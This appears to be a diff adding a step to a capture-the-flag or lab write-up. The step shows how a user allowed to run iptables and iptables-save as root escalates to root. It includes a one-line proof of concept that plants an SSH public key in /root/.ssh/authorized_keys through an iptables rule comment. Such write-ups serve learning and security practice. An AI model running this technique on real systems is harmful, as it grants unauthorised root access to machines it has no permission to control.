@@ -259,6 +259,20 @@ print(r.text)
 
 ------------
 
+- User `sergej` can run binaries `iptables` and `iptables-save` as root
+
+![image](https://github.com/user-attachments/assets/52c7a698-882e-4a31-b479-b62eea8faa8a)
+
+- I found this interesting [article](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/) on how to overwrite files with the two binaries.I used it to overwrite the root user's `authorized_keys` file.
+
+![image](https://github.com/user-attachments/assets/7629fb00-e273-4ecd-9c64-eded6b95c664)
+
+
+- POC-:
+
+```bash
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[public-key]\n';sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
+```
 
 
 
